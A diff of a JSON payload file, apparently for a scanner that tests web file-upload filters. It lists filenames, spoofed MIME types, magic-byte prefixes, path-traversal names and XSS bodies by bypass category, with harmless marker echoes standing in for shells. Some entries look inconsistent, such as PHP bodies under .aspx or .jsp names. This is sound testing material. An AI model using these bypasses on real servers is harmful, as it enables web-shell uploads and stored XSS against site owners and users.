@@ -1,28 +1,425 @@
 [
-  {"filename": "shell.phtml", "mime": "image/jpeg", "body": "<?php echo \"VL_AI_EXT_BYPA\"; ?>", "category": "ext-bypass"},
-  {"filename": "shell.php5", "mime": "image/jpeg", "body": "<?php echo \"VL_AI_EXT_BYPA\"; ?>", "category": "ext-bypass"},
-  {"filename": "shell.php7", "mime": "image/png", "body": "<?php echo \"VL_AI_EXT_BYPA\"; ?>", "category": "ext-bypass"},
-  {"filename": "shell.pht", "mime": "image/png", "body": "<?php echo \"VL_AI_EXT_BYPA\"; ?>", "category": "ext-bypass"},
-  {"filename": "shell.phar", "mime": "application/octet-stream", "body": "<?php echo \"VL_AI_EXT_BYPA\"; ?>", "category": "ext-bypass"},
-  {"filename": "shell.pHp", "mime": "image/jpeg", "body": "<?php echo \"VL_AI_CASE_BYP\"; ?>", "category": "case-bypass"},
-  {"filename": "shell.PHP", "mime": "image/jpeg", "body": "<?php echo \"VL_AI_CASE_BYP\"; ?>", "category": "case-bypass"},
-  {"filename": "shell.php.jpg", "mime": "image/jpeg", "body": "<?php echo \"VL_AI_DOUBLE_E\"; ?>", "category": "double-ext"},
-  {"filename": "shell.jpg.php", "mime": "image/jpeg", "body": "<?php echo \"VL_AI_DOUBLE_E\"; ?>", "category": "double-ext"},
-  {"filename": "shell.php.png", "mime": "image/png", "body": "<?php echo \"VL_AI_DOUBLE_E\"; ?>", "category": "double-ext"},
-  {"filename": "shell.php%00.jpg", "mime": "image/jpeg", "body": "<?php echo \"VL_AI_NULL_BYT\"; ?>", "category": "null-byte"},
-  {"filename": "shell.php%00.png", "mime": "image/png", "body": "<?php echo \"VL_AI_NULL_BYT\"; ?>", "category": "null-byte"},
-  {"filename": "avatar.php", "mime": "image/gif", "body": "<?php echo \"VL_AI_MAGIC_BY\"; ?>", "magic_prefix": "GIF89a;\n", "category": "magic-bypass"},
-  {"filename": "image.php", "mime": "image/gif", "body": "<?php echo \"VL_AI_MAGIC_BY\"; ?>", "magic_prefix": "GIF89a;\n", "category": "magic-bypass"},
-  {"filename": "polyglot.gif.php", "mime": "image/gif", "body": "<?php echo \"VL_AI_POLYGLOT\"; ?>", "magic_prefix": "GIF89a;\n", "category": "polyglot"},
-  {"filename": "vlxss.svg", "mime": "image/svg+xml", "body": "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('VL_AI_STORED_X')\"><text>VL_AI_STORED_X</text></svg>", "category": "stored-xss"},
-  {"filename": "vlxss.html", "mime": "text/html", "body": "<html><body>VL_AI_STORED_X<script>alert('VL_AI_STORED_X')</script></body></html>", "category": "stored-xss"},
-  {"filename": "vlxss.xml", "mime": "text/xml", "body": "<note>VL_AI_STORED_X</note>", "category": "stored-xss"},
-  {"filename": "shell.php", "mime": "image/png", "body": "<?php echo \"VL_AI_MIME_SPO\"; ?>", "category": "mime-spoof"},
-  {"filename": "shell.jsp", "mime": "image/jpeg", "body": "<%= \"VL_AI_MIME_SPO\" %>", "category": "mime-spoof"},
-  {"filename": "shell.php;.jpg", "mime": "image/jpeg", "body": "<?php echo \"VL_AI_SEMICOLO\"; ?>", "category": "semicolon-bypass"},
-  {"filename": "shell.asp;.png", "mime": "image/png", "body": "<% Response.Write(\"VL_AI_SEMICOLO\") %>", "category": "semicolon-bypass"},
-  {"filename": "..%2f..%2fshell.php", "mime": "image/jpeg", "body": "<?php echo \"VL_AI_PATH_TRA\"; ?>", "category": "path-traversal"},
-  {"filename": "....//shell.php", "mime": "image/jpeg", "body": "<?php echo \"VL_AI_PATH_TRA\"; ?>", "category": "path-traversal"},
-  {"filename": "shell.php", "mime": "application/x-php", "body": "<?php echo \"VL_AI_DIRECT\"; ?>", "category": "direct"},
-  {"filename": "cmd.jsp", "mime": "application/octet-stream", "body": "<%= \"VL_AI_DIRECT\" %>", "category": "direct"}
+  {
+    "filename": "shell.phtml",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.php3",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.php4",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.php5",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.php7",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.pht",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.phar",
+    "mime": "application/octet-stream",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.phps",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.inc",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.module",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.aspx",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.ashx",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.aspx",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.cshtml",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.jspx",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.jspf",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "ext-bypass"
+  },
+  {
+    "filename": "shell.pHp",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "case-bypass"
+  },
+  {
+    "filename": "shell.PHP",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "case-bypass"
+  },
+  {
+    "filename": "shell.Php5",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "case-bypass"
+  },
+  {
+    "filename": "shell.PhTmL",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "case-bypass"
+  },
+  {
+    "filename": "shell.AsP",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "case-bypass"
+  },
+  {
+    "filename": "shell.JsP",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "case-bypass"
+  },
+  {
+    "filename": "shell.php.jpg",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "double-ext"
+  },
+  {
+    "filename": "shell.jpg.php",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "double-ext"
+  },
+  {
+    "filename": "shell.php.png",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "double-ext"
+  },
+  {
+    "filename": "shell.png.php",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "double-ext"
+  },
+  {
+    "filename": "shell.php.gif",
+    "mime": "image/gif",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "double-ext"
+  },
+  {
+    "filename": "shell.php.JPEG",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "double-ext"
+  },
+  {
+    "filename": "shell.asp.jpg",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "double-ext"
+  },
+  {
+    "filename": "shell.jsp.png",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "double-ext"
+  },
+  {
+    "filename": "image.jpg.phtml",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "double-ext"
+  },
+  {
+    "filename": "shell.php%00.jpg",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "null-byte"
+  },
+  {
+    "filename": "shell.php%00.png",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "null-byte"
+  },
+  {
+    "filename": "shell.php\u0000.jpg",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "null-byte"
+  },
+  {
+    "filename": "shell.asp%00.gif",
+    "mime": "image/gif",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "null-byte"
+  },
+  {
+    "filename": "avatar.php",
+    "mime": "image/gif",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "magic-bypass",
+    "magic_prefix": "GIF89a;\n"
+  },
+  {
+    "filename": "image.php",
+    "mime": "image/gif",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "magic-bypass",
+    "magic_prefix": "GIF89a;\n"
+  },
+  {
+    "filename": "photo.php",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "magic-bypass",
+    "magic_prefix": "PNG\r\n\u001a\n"
+  },
+  {
+    "filename": "pic.php",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "magic-bypass",
+    "magic_prefix": "ÿØÿà\u0000\u0010JFIF"
+  },
+  {
+    "filename": "logo.phtml",
+    "mime": "image/gif",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "magic-bypass",
+    "magic_prefix": "GIF89a;\n"
+  },
+  {
+    "filename": "upload.php5",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "magic-bypass",
+    "magic_prefix": "PNG\r\n\u001a\n"
+  },
+  {
+    "filename": "polyglot.gif.php",
+    "mime": "image/gif",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "polyglot",
+    "magic_prefix": "GIF89a;\n"
+  },
+  {
+    "filename": "polyglot.png.php",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "polyglot",
+    "magic_prefix": "PNG\r\n\u001a\n"
+  },
+  {
+    "filename": "polyglot.jpg.php",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "polyglot",
+    "magic_prefix": "ÿØÿà\u0000\u0010JFIF"
+  },
+  {
+    "filename": "vlxss.svg",
+    "mime": "image/svg+xml",
+    "body": "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('VL_AI_STORED_X')\"><text>VL_AI_STORED_X</text></svg>",
+    "category": "stored-xss"
+  },
+  {
+    "filename": "vlxss2.svg",
+    "mime": "image/svg+xml",
+    "body": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(\"VL_AI_STORED_X\")</script></svg>",
+    "category": "stored-xss"
+  },
+  {
+    "filename": "vlxss.html",
+    "mime": "text/html",
+    "body": "<html><body>VL_AI_STORED_X<script>alert(\"VL_AI_STORED_X\")</script></body></html>",
+    "category": "stored-xss"
+  },
+  {
+    "filename": "vlxss.htm",
+    "mime": "text/html",
+    "body": "<img src=x onerror=alert(\"VL_AI_STORED_X\")>",
+    "category": "stored-xss"
+  },
+  {
+    "filename": "vlxss.xml",
+    "mime": "text/xml",
+    "body": "<note>VL_AI_STORED_X</note>",
+    "category": "stored-xss"
+  },
+  {
+    "filename": "vlxss.xhtml",
+    "mime": "application/xhtml+xml",
+    "body": "<html xmlns=\"http://www.w3.org/1999/xhtml\"><body><script>alert(\"VL_AI_STORED_X\")</script></body></html>",
+    "category": "stored-xss"
+  },
+  {
+    "filename": "shell.php",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "mime-spoof"
+  },
+  {
+    "filename": "shell.php",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "mime-spoof"
+  },
+  {
+    "filename": "shell.php",
+    "mime": "image/gif",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "mime-spoof"
+  },
+  {
+    "filename": "shell.jsp",
+    "mime": "image/jpeg",
+    "body": "<%= \"VL_AI_MIME_SPO\" %>",
+    "category": "mime-spoof"
+  },
+  {
+    "filename": "shell.asp",
+    "mime": "image/png",
+    "body": "<% Response.Write(\"VL_AI_MIME_SPO\") %>",
+    "category": "mime-spoof"
+  },
+  {
+    "filename": "shell.phtml",
+    "mime": "application/pdf",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "mime-spoof"
+  },
+  {
+    "filename": "shell.php;.jpg",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "semicolon-bypass"
+  },
+  {
+    "filename": "shell.asp;.png",
+    "mime": "image/png",
+    "body": "<% Response.Write(\"VL_AI_SEMICOLO\") %>",
+    "category": "semicolon-bypass"
+  },
+  {
+    "filename": "shell.aspx;.gif",
+    "mime": "image/gif",
+    "body": "<% Response.Write(\"VL_AI_SEMICOLO\") %>",
+    "category": "semicolon-bypass"
+  },
+  {
+    "filename": "shell.jsp;.jpg",
+    "mime": "image/jpeg",
+    "body": "<%= \"VL_AI_SEMICOLO\" %>",
+    "category": "semicolon-bypass"
+  },
+  {
+    "filename": "..%2f..%2fshell.php",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "path-traversal"
+  },
+  {
+    "filename": "....//shell.php",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "path-traversal"
+  },
+  {
+    "filename": "../../../var/www/html/shell.php",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "path-traversal"
+  },
+  {
+    "filename": "..\\..\\shell.php",
+    "mime": "image/jpeg",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "path-traversal"
+  },
+  {
+    "filename": "%2e%2e%2fshell.php",
+    "mime": "image/png",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "path-traversal"
+  },
+  {
+    "filename": "shell.php",
+    "mime": "application/x-php",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "direct"
+  },
+  {
+    "filename": "cmd.jsp",
+    "mime": "application/octet-stream",
+    "body": "<%= \"VL_AI_DIRECT\" %>",
+    "category": "direct"
+  },
+  {
+    "filename": "shell.asp",
+    "mime": "text/plain",
+    "body": "<% Response.Write(\"VL_AI_DIRECT\") %>",
+    "category": "direct"
+  },
+  {
+    "filename": "test.php",
+    "mime": "application/x-httpd-php",
+    "body": "<?php echo \"VL_AI_MARK\"; ?>",
+    "category": "direct"
+  }
 ]
